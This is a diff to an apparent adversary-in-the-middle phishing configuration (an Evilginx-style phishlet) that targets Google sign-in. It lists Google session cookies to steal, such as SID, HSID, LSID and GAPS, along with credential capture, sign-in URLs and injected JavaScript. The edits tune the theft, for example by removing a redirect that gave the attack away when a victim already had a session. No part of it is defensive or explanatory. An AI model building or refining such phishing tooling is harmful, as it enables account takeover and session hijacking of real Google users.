@@ -35,16 +35,16 @@ sub_filters:
 # Cookies to steal
 auth_tokens:
   - domain: '.google.com'
-    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id"]
     force_post: true
   - domain: 'accounts.google.com'
-    keys: ["GAPS", "LSID", "ACCOUNT_CHOOSER", ".*,regexp"]
+    keys: ["GAPS", "LSID", "ACCOUNT_CHOOSER"]
     force_post: true
   - domain: '.accounts.google.com'
-    keys: ["GAPS", "LSID", "ACCOUNT_CHOOSER", ".*,regexp"]
+    keys: ["GAPS", "LSID", "ACCOUNT_CHOOSER"]
     force_post: true
   - domain: 'myaccount.google.com'
-    keys: [".*,regexp"]
+    keys: ["SIDCC", "__Secure-1PSIDCC", "__Secure-3PSIDCC"]
     force_post: true
 
 # Capture username/password credentials
@@ -69,10 +69,8 @@ credentials:
 
 # URLs that finalize authentication
 auth_urls:
-  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
   - '/CheckCookie'
   - '/ManageAccount'
-  - '/signin/challenge'
   - '/login/sessionCookieRedirect'
 
 # Corrected forced POST redirection for consistency
@@ -93,13 +91,8 @@ force_post:
 # Legitimate site login page location
 login:
   domain: 'accounts.google.com'
-  path: '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+  path: '/ServiceLogin?hl=en&passive=true&continue=https%3A%2F%2Fmyaccount.google.com'
 
-path_rewrite:
-  - trigger: '/verification'
-    target: '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
-  - trigger: '/signin/v2/identifier'
-    target: '/v3/signin/identifier'
 
 # Injected JavaScript for redirection
 js_inject:
@@ -121,14 +114,7 @@ js_inject:
             }).catch(() => {});
           }
         });
-  - trigger_domains: ['accounts.google.com']
-    trigger_paths: ['/signin', '/v3/signin']
-    script: |
-        document.addEventListener('DOMContentLoaded', function() {
-          if (document.cookie.includes('SID') && document.cookie.includes('HSID')) {
-            window.location.href = 'https://myaccount.google.com';
-          }
-        });
+  # Removed: SID/HSID cookie check redirect — fires immediately if user has existing Google session
   - trigger_domains: ['accounts.google.com']
     trigger_paths: ['*']
     script: |
